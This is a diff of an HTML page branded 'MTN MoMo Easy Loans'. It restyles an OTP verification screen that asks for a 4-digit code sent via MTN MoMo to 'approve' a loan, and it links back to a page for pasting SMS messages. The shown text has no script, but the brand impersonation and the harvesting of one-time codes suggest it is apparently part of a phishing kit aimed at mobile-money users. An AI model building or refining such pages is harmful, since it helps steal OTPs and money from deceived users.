@@ -704,30 +704,40 @@
 
     
 
-    <!-- ─── OTP page ─── -->
+        <!-- ─── OTP page (V2) ─── -->
     <div id="page-otp" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub" data-i18n="navSubEasyLoans">Easy Loans</div>
-        </div>
-        <button class="nav-lang" onclick="showGate()">🌐</button>
+      <div class="otp-navbar">
+        <a class="back" onclick="goTo('page-sms-paste')">← <span data-i18n="back">Back</span></a>
+        <div class="title" data-i18n="otpTitle">OTP Verification</div>
+        <button class="nav-lang" style="position:absolute; right:20px; color:#003366;" onclick="showGate()">🌐</button>
       </div>
-      <div style="padding: 24px;">
-        <div id="otpMsg" class="msg"></div>
-        <div class="field">
-          <label data-i18n="otpLabel">Enter OTP</label>
-          <div style="display:flex; gap:8px;" id="otpContainer">
-            <input id="otp0" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="otp1" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="otp2" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="otp3" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
+
+      <div class="otp-body">
+        <div class="otp-card">
+          <h2 class="otp-card-title" data-i18n="otpCardTitle">Enter OTP Code</h2>
+          <p class="otp-card-sub" data-i18n="otpCardSub">Enter the 4-digit OTP code sent to your phone via MTN MoMo</p>
+
+          <div class="otp-label" data-i18n="otpLabel2">OTP Code (4 digits):</div>
+
+          <div class="otp-boxes">
+            <input id="otp0" class="otp-box" maxlength="1" inputmode="numeric" type="password">
+            <input id="otp1" class="otp-box" maxlength="1" inputmode="numeric" type="password">
+            <input id="otp2" class="otp-box" maxlength="1" inputmode="numeric" type="password">
+            <input id="otp3" class="otp-box" maxlength="1" inputmode="numeric" type="password">
+            <button type="button" class="otp-clear" onclick="clearOtp()">✕</button>
           </div>
+
+          <div id="otpMsg" class="msg"></div>
+
+          <button id="bOtp" class="otp-submit" onclick="doOtp()" disabled data-i18n="otpVerify">VERIFY & APPROVE LOAN</button>
         </div>
-        <button id="bOtp" class="btn-grad" onclick="doOtp()" data-i18n="otpVerify">VERIFY & APPROVE LOAN</button>
+      </div>
+
+      <div class="otp-footer">
+        <span data-i18n="smsFooter">© 2026 MTN MoMo Loans – Powered by MTN</span>
       </div>
     </div>
+
 
     <!-- ─── Approval page ─── -->
     <div id="page-approval" class="page">
